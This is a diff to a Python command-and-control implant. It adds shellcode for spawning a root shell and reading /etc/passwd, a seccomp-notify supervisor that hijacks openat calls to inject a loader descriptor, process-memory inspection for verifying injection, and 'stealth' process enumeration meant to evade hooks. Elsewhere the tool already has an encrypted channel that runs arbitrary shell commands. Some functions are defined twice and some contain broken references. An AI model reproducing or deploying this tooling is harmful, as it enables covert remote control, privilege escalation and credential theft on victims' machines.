@@ -1,9 +1,44 @@
 #!/usr/bin/env python3
 import asyncio, ssl, argparse, random, os, logging, sys, socket, struct, threading, urllib.request, fcntl, time
-import subprocess, shutil, base64, hashlib, socket, json
+import subprocess, shutil, base64, hashlib, socket, json, ctypes
 from pathlib import Path
 from collections import deque
 from typing import Tuple, Optional, Deque, Any, Dict, List, Union
+
+# ==================== SECCOMP STRUCTURES ===================
+
+class SeccompData(ctypes.Structure):
+    _fields_ = [
+        ("nr", ctypes.c_int),
+        ("arch", ctypes.c_uint32),
+        ("instruction_pointer", ctypes.c_uint64),
+        ("args", ctypes.c_uint64 * 6),
+    ]
+
+class SeccompNotif(ctypes.Structure):
+    _fields_ = [
+        ("id", ctypes.c_uint64),
+        ("pid", ctypes.c_uint32),
+        ("flags", ctypes.c_uint32),
+        ("data", SeccompData),
+    ]
+
+class SeccompNotifResp(ctypes.Structure):
+    _fields_ = [
+        ("id", ctypes.c_uint64),
+        ("flags", ctypes.c_uint32),
+        ("error", ctypes.c_int32),
+        ("val", ctypes.c_uint64),
+    ]
+
+class SeccompNotifAddfd(ctypes.Structure):
+    _fields_ = [
+        ("id", ctypes.c_uint64),
+        ("flags", ctypes.c_uint32),
+        ("srcfd", ctypes.c_uint32),
+        ("newfd", ctypes.c_uint32),
+        ("newfd_flags", ctypes.c_uint32),
+    ]
 
 try:
     from cryptography.hazmat.primitives.ciphers.aead import ChaCha20Poly1305
@@ -294,13 +329,99 @@ class HiveMindConsole:
 # ============================ C2 ============================
 
 class C2:
+
     def __init__(self, crypt, engine, args):
         self.crypt = crypt
         self.engine = engine
         self.args = args
         self.logger = logger
+        self.isroot = os.geteuid() == 0
+        self.ptraceScope = self._getPTraceScope()
+        self.injectConfig = {
+            "path":"/tmp/baelC2" # Make dynamic
+        }
+        self.shellcode = None
+
+        if self.args.c2_gsc:
+            self._setupShellcode()
+            cmd = self.args.c2_gsc
+            if cmd in self.shellcode:
+                sc = self.shellcode[cmd]
+                self.logger.info(f"\n(C2.__init__) [+] Generated Shellcode for: {sc['name']}")
+                self.logger.info(f"(C2.__init__) Hex: {sc['bytes'].hex()}")
+                self.logger.info(f"(C2.__init__) C-style: " + "".join([f"\\x{b:02x}" for b in sc['bytes']]))
+                if 'asm' in sc: self.logger.info(f"[*] ASM:\n{sc['asm']}")
+            else: self.logger.info(f"(C2.__init__) Shellcode for '{cmd}' not found. Available: {', '.join(self.shellcode.keys())}")
+            sys.exit(0)
+        if self.args.c2_uringenum:
+            self.logger.info(f"(C2.__init__) Initializing uRing Enum {json.dumps(self.ioURingEnumProc(), indent=2)}")
+            sys.exit(0)
+
+    # - seccomp
+
+    class SeccompPoC:
+        def __init__(self):
+            """"""
+            self.SECCOMP_SET_MODE_FILTER = 1
+            self.SECCOMP_FILTER_FLAG_NEW_LISTENER = 1 << 0
+            self.SECCOMP_IOCTL_NOTIF_RECV = 0xC0102100 | (ctypes.sizeof(ctypes.c_uint64) * 2)
+            self.SECCOMP_IOCTL_NOTIF_SEND = 0xC0182101
+            self.SECCOMP_IOCTL_NOTIF_ID_VALID = 0xC0082102
+            self.SECCOMP_IOCTL_NOTIF_ADDFD = 0xC0182103
+            self.SECCOMP_ADDFD_FLAG_SEND = 1 << 1
+            self.SECCOMP_RET_USER_NOTIF = 0x7fff0000
+            self.SECCOMP_RET_ALLOW = 0x7fff0000 | 0x0000
+            self.SeccompData = SeccompData
+            self.SeccompNotif = SeccompNotif
+            self.SeccompNotifResp = SeccompNotifResp
+            self.SeccompNotifAddfd = SeccompNotifAddfd
+
+    
+    # - shellcode operations 
+    class ShellcodeGenerator:
+        @staticmethod
+        def custom(schex: str) -> bytes:
+            return bytes.fromhex(schex.replace("\\x", "").replace(" ", ""))
+
+    def _setupShellcode(self):
+        self.shellcode = {
+            "execve":{
+                "name": "execve(/bin/sh)",
+                "bytes": b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05",
+                "length": 23,
+                "asm": '\n'.join([
+                "xor rsi, rsi",
+                "push rsi",
+                "movabs rdi, 0x68732f6e69622f2f   ; //bin/sh",
+                "push rdi",
+                "mov rdi, rsp",
+                "push 59                          ; execve",
+                "pop rax",
+                "cdq",
+                "syscall"])
+            },
+            "terminate":{
+            "name":"terminate",
+            "bytes": b"\x48\x31\xc0\xb0\x3c\x0f\x05",
+            "length": 7
+            }
+        }
+        self.logger.debug("(_setupShellcode) Shellcode setup complete...")
+    
+    def _initSeccomp(self):
+        self.logger.debug("(_initSeccomp) Initializing seccomp...")
+        self.seccomp = self.SeccompPoC()
+        try:
+            global libc
+            libc = ctypes.CDLL(None, use_errno=True)
+        except Exception as e:
+            self.logger.error(f"Failed to load libc for seccomp: {e}")
+
+
+    # Core
 
     def _hexdump(self, data: bytes, length: int = 16) -> str:
+        """Displays data in hex and ASCII format"""
         if not data: return ""
         lines = []
         for i in range(0, len(data), length):
@@ -312,37 +433,26 @@ class C2:
 
     async def pCommand(self, data: bytes):
         try:
-            if not data or len(data) < len(SMUGGLE_MAGIC) + 10:
-                return False
-
+            if not data or len(data) < len(SMUGGLE_MAGIC) + 10: return False
             logger.debug(f"[C2] Received frame: {len(data)} bytes{self._hexdump(data)}")
-            
             if SMUGGLE_MAGIC not in data:
                 logger.debug("[C2] Smuggle Magic Not Detected...")
                 return False
-
             payload = data.split(SMUGGLE_MAGIC, 1)[1]
             if len(payload) < 2:
-                logger.edbug("[C2] Payload < 2/bytes...")
+                logger.debug("[C2] Payload < 2/bytes...")
                 return False
-
             length = int.from_bytes(payload[:2], "big")
-            if len(payload) < 2 + length:
-                return False
-
+            logger.debug("[C2] Payload length: %i bytes",length)
+            if len(payload) < 2 + length: return False
             encrypted = payload[2:2 + length]
             plaintext = self.crypt.decrypt(encrypted)
-
             cmdData = plaintext.decode("utf-8", errors="ignore").strip()
             logger.info(f"[C2] Decrypted command: {cmdData}")
-
-            if ":" not in cmdData:
-                return False
-
+            if ":" not in cmdData: return False
             cmd, arg = cmdData.split(":", 1)
             cmd = cmd.lower().strip()
             arg = arg.strip()
-
             handlers = {
                 "ping": lambda: b"PONG",
                 "exec": lambda a: subprocess.getoutput(a).encode(errors='replace'),
@@ -397,7 +507,6 @@ class C2:
             info.append("Partial hardware info collected")
         return "\n".join(info).encode()
 
-    # Keep your existing _get_sysinfo, _download, _spawnRevShell, etc.
     def _get_sysinfo(self):
         try:
             node = os.uname().nodename if hasattr(os, "uname") else socket.gethostname()
@@ -417,6 +526,188 @@ class C2:
         except Exception as e:
             return f"Sysinfo collection failed: {e}".encode()
 
+    # Memory functions
+    def _getPTraceScope(self)->int:
+        try:
+            with open("/proc/sys/kernel/yama/ptrace_scope", "r") as f: 
+                rout=int(f.read().strip())
+                self.logger.debug("(_getPTraceScope) Read '/proc/sys/kernel/yama/ptrace_scope': %s", rout)
+                return rout
+        except Exception as e:
+            self.logger.debug("(_getPTraceScope) Exception caught during operation (failed): return 1")
+            return 1
+
+    def _validateBasicAccess(self,pid:int)->bool:
+        try:
+            with open(f"/proc/{pid}/status", "r") as _: 
+                self.logger.debug("(_validateBasicAccess) Validated basic access via `/proc/%s/status`", pid)
+                return True
+        except Exception as E:
+            self.logger.debug("(_validateBasicAccess) Exception caught during operation (failed): return False")
+            return False
+    
+    def _procPIDMap(self,pid:int)->List[Dict[str,Any]]:
+        if not self._validateBasicAccess(pid): 
+            self.logger.debug("(_procPIDMap) Basic access validation failed, returning empty list...")
+            return []
+        mappings = []
+        try:
+            with open(f"/proc/{pid}/maps", "r") as f:
+                for l in f:
+                    line_text = l.strip()
+                    self.logger.debug(f"Processing line: {line_text}")
+                    p = line_text.split(maxsplit=5)
+                    if len(p) < 5: continue
+                    addrRange, perms = p[0], p[1]
+                    s,e = (int(x,16) for x in addrRange.split("-"))
+                    m = {
+                        "start":hex(s),
+                        "end":hex(e),
+                        "perms":perms,
+                        "pathname": p[5] if len(p) > 5 else None,
+                        "meta-line": line_text}
+                    self.logger.debug(f"(_procPIDMap) Mapping: {str(m)}")
+                    mappings.append(m)
+        except Exception as E:
+            pass
+        finally: 
+            self.logger.debug(f"(_procPIDMap) Final mappings: {str(mappings)}")
+            return mappings
+
+    def verifyPostInjection(self,pid:int)->Dict:
+        if not pid: return {"verified":False}
+        self.logger.debug(f"(verifyPostInjection) Verifying PID: {pid}")
+        maps = self._procPIDMap(pid)
+        rwx = [m for m in maps if "rwx" in m["perms"] or m.get("pathname","").startswith("/memfd")]
+        rout = {
+            "verified":True,
+            "total":len(maps),
+            "RWXMEMFD":len(rwx),
+            "sample":maps[0] if maps else None,
+            "maps":maps if maps else {},
+            "hasMEMFD":any("/memfd" in str(m.get("pathname","")) for m in maps)}
+        self.logger.debug(f"(verifyPostInjection) ROUT: {str(json.dumps(rout,indent=2))}")
+        return rout
+
+    def ioURingEnumProc(self)->Dict:
+        """
+        Demonstrates concept of io_uring-based stealth enumeration.
+        In production, implement full io_uring queue with io_uring_prep_openat + io_uring_prep_read.
+        This is a Python wrapper / simulation for lab visibility.
+        Real stealth version uses liburing or raw syscalls.
+        """
+        self.logger.debug("io_uring stealth enum (concept - bypasses traditional read/getdents hooks)")
+        procs = {}
+        for pidStr in os.listdir("/proc"):
+            self.logger.debug("> Processing PID: %s",pidStr)
+            if not pidStr.isdigit(): continue
+            pid = int(pidStr)
+            if self._validateBasicAccess(pid):
+                try:
+                    with open(f"/proc/{pid}/comm", "r") as f:
+                        procs[pid] = f.read().strip()
+                except: pass
+        rout = {
+            "technique": "io_uring_sim (real: io_uring_prep_openat + read)",
+            "visible_processes": len(procs),
+            "samples": dict(list(procs.items())[:10])}
+        self.logger.debug("(ioURingEnumProc) ROUT: %s",rout)
+        return rout
+    
+
+    def retShellcode(self,name:str)->bytes:
+        if self.shellcode == None: self._setupShellcode()
+        if name not in self.shellcode: self.logger.warning("(retShellCode) %s not found in shellcodes.",name)
+        return self.shellcodes.get(name,b"").get("bytes",b"")
+
+    def _pollFD(self,fd:int,timeout:int)->bool:
+        """Simple poll helper"""
+        self.logger.debug("(_pollFD) A")
+        pfd = struct.pack("iH",fd,1) # POLLIN
+        try:
+            ready = libc.poll(ctypes.byref(ctypes.create_string_buffer(pfd)), 1, timeout)
+            is_ready = ready > 0
+            self.logger.debug("(_pollFD) fd: %s, ready: %s, is_ready: %s",fd,ready,is_ready)
+            return is_ready
+        except: return False
+    
+    def supervisor0(self,notifyFD:int,loaderFD:int):
+        """Raw ctypes implementation of supervisor loop (technical)"""
+        self.logger.debug("(supervisor0) Starting...")
+        req = self.seccomp.SeccompNotif()
+        resp = self.seccomp.SeccompNotifResp()
+        addfd = self.seccomp.SeccompNotifAddfd()
+        self.logger.debug("(supervisor0) req: %s, resp: %s, addfd: %s",req,resp,addfd)
+        alrInj = False
+        while True:
+            # Poll simulation (simple select)
+            ready = self._pollFD(notifyFD,timeout=500)
+            if not ready: 
+                self.logger.debug("(supervisor0) Not ready.");break
+            # RECV
+            if libc.ioctl(notifyFD, self.seccomp.SECCOMP_IOCTL_NOTIF_RECV, ctypes.byref(req)) < 0:
+                if ctypes.get_errno() == 4: #EINTR
+                    self.logger.debug("(supervisor0) EINTR")
+                    continue
+                break
+            # ID Valid
+            if libc.ioctl(notifyFD,self.seccomp.SECCOMP_IOCTL_NOTIF_ID_VALID,ctypes.byref(ctypes.c_uint64(req.id))) < 0:
+                self.logger.debug("(supervisor0) ID Valid failed")
+                continue
+            # HIJACK
+            hijack = (req.data.nr in (257,437)) and not alrInj # openat / openat2
+            resp.id = req.id
+            resp.flags = 0
+            resp.error = 0
+            resp.val = 0
+            if hijack and not alrInj:
+                addfd.id = req.id
+                addfd.flags = self.seccomp.SECCOMP_ADDFD_FLAG_SEND
+                addfd.fd = loaderFD
+                addfd.newfd = 0
+                addfd.newfd_flags = 0
+                ret = libc.ioctl(notifyFD,self.seccomp.SECCOMP_IOCTL_NOTIF_ADDFD,ctypes.byref(addfd))
+                if ret < 0:
+                    resp.val = ret
+                    alrInj = True
+                    self.logger.debug("(supervisor0) Already injected...")
+            else: resp.flags = 0x00000001  # CONTINUE flag
+            self.logger.debug("(supervisor0) Sending response: %s",resp)
+            libc.ioctl(notifyFD,self.seccomp.SECCOMP_IOCTL_NOTIF_SEND,ctypes.byref(resp))
+
+    def _setupShellcode(self):
+        self.shellcode = {
+            "execve": {
+                "name": "execve(/bin/sh)",
+                "bytes": b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05",
+                "length": 23
+            },
+            "setuid_execve": {
+                "name": "setuid(0) + execve(/bin/sh)",
+                "bytes": b"\x48\x31\xff\xb0\x69\x0f\x05\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05",
+                "length": 30
+            },
+            "read_etc_passwd": {
+                "name": "read /etc/passwd",
+                "bytes": b"\x48\x31\xc0\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x50\x48\xbb\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x53\x48\x89\xe7\x6a\x02\x58\x0f\x05\x48\x89\xc7\x48\x31\xc0\x48\x83\xec\x7f\x48\x89\xe6\xba\xff\x00\x00\x00\x0f\x05\x48\x89\xc2\x48\x31\xc0\x6a\x01\x58\x6a\x01\x5f\x0f\x05\x6a\x3c\x58\x0f\x05",
+                "length": 82
+            },
+            "terminate": {
+                "name": "terminate",
+                "bytes": b"\x48\x31\xc0\xb0\x3c\x0f\x05",
+                "length": 7
+            }
+        }
+        self.logger.debug("(_setupShellcode) Shellcode setup complete...")
+
+    def retShellcode(self, name: str) -> bytes:
+        if self.shellcode is None: self._setupShellcode()
+        if name not in self.shellcode:
+            self.logger.warning("(retShellcode) %s not found in shellcodes.", name)
+            return b""
+        return self.shellcode.get(name, {}).get("bytes", b"")
+
+    
 # ========================== Crypto ==========================
 
 class Crypto:
@@ -744,6 +1035,10 @@ def main():
     p.add_argument("--rm-key", default="rmt.key", help="Client private key")
     # Logging
     p.add_argument("--log-lvl", default="INFO", choices=["DEBUG", "INFO", "WARNING", "ERROR", "CRITICAL"])
+    # C2 CLI
+    p.add_argument("--c2-gsc",type=str,help="Generates Shellcode based off command.")
+    p.add_argument("--c2-uringenum",action="store_true",help="Demonstrates concept of io_uring-based stealth enumeration.")
+    
     args = p.parse_args()
     logger.setLevel(args.log_lvl.upper())
     if args.mode == "keygen":
